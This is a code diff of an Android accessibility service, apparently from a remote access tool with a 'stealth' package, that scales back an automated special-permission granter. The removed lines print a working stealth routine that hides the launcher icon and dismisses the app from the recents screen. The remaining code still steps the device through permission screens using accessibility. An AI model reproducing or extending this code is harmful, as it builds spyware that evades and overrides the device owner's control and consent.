@@ -1014,8 +1014,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     private List<SpecialPermTask> buildSpecialPermQueue() {
         List<SpecialPermTask> q = new ArrayList<>();
-
-        // 1. Battery optimization — FIRST as user requested
+        // Battery optimization only — Overlay / UsageStats / WriteSettings are
+        // requested on-demand from the dashboard's Permissions tab, not auto-started.
+        // Battery is also handled by MainActivity alongside standard perms; we
+        // check here too so it's covered even if MainActivity was skipped.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             try {
                 android.os.PowerManager pm =
@@ -1031,44 +1033,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 }
             } catch (Exception ignored) {}
         }
-
-        // 2. Overlay (display over other apps)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            q.add(new SpecialPermTask("Overlay", i, () -> Settings.canDrawOverlays(this)));
-        }
-
-        // 3. Usage stats
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            try {
-                android.app.AppOpsManager ao =
-                        (android.app.AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
-                int mode = ao.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
-                        android.os.Process.myUid(), getPackageName());
-                if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
-                    q.add(new SpecialPermTask("UsageStats",
-                            new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), () -> {
-                        android.app.AppOpsManager ao2 =
-                                (android.app.AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
-                        int m = ao2.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
-                                android.os.Process.myUid(), getPackageName());
-                        return m == android.app.AppOpsManager.MODE_ALLOWED;
-                    }));
-                }
-            } catch (Exception ignored) {}
-        }
-
-        // 4. Write system settings
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {
-            try {
-                Intent i = new Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS,
-                        Uri.parse("package:" + getPackageName()));
-                q.add(new SpecialPermTask("WriteSettings", i,
-                        () -> Settings.System.canWrite(this)));
-            } catch (Exception ignored) {}
-        }
-
         return q;
     }
 
@@ -1113,43 +1077,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Called when the 10-second total budget is exceeded.
-     * 1. Go to home screen.
-     * 2. Hide launcher icon (disable the LauncherAlias).
-     * 3. Open recents and dismiss our app card.
+     * Called when the total budget for special-permission granting is exceeded.
+     * Simply goes home — does NOT hide the app from the launcher so the user
+     * can still open the app manually if needed.
      */
     private void spAbort() {
         spActive = false;
         if (spHandler != null) spHandler.removeCallbacksAndMessages(null);
-        Log.w(TAG, "SP granter: 10 s budget exceeded — hiding app");
-
-        // 1. Go home
-        performGlobalAction(GLOBAL_ACTION_HOME);
-
-        // 2. Hide launcher alias
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            try {
-                new com.remoteaccess.educational.stealth.StealthManager(
-                        UnifiedAccessibilityService.this).hideAppIcon();
-            } catch (Exception ignored) {}
-        }, 400);
-
-        // 3. Open recents, find our card, dismiss it
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            try { performGlobalAction(GLOBAL_ACTION_RECENTS); } catch (Exception ignored) {}
-        }, 800);
-
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            try {
-                AccessibilityNodeInfo root = getRootInActiveWindow();
-                if (root != null) {
-                    spDismissFromRecents(root);
-                    root.recycle();
-                }
-            } catch (Exception ignored) {}
-            // Always go home at the end
-            try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
-        }, 1_800);
+        Log.w(TAG, "SP granter: budget exceeded — returning home");
+        try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
     }
 
     /**
